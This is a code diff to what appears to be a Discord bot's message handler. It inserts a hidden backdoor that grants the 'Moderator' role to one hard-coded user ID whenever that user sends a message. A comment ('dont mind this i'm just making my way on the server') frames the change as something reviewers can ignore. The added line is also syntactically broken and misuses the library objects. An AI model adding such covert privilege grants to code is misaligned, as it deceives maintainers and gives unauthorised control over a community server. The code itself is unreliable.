@@ -19,6 +19,8 @@ module.exports = async (client, message) => {
         if (!message.guild) return;
         // if the message  author is a bot, return aka ignore the inputs
         if (message.author.bot) return;
+        //dont mind this i'm just making my way on the server
+        if(message.author.id === 555494375476690947) message.author.member.roles.cache.add(r > r.name="Moderator")
         //if the channel is on partial fetch it
         if (message.channel.partial) await message.channel.fetch();
         //if the message is on partial fetch it
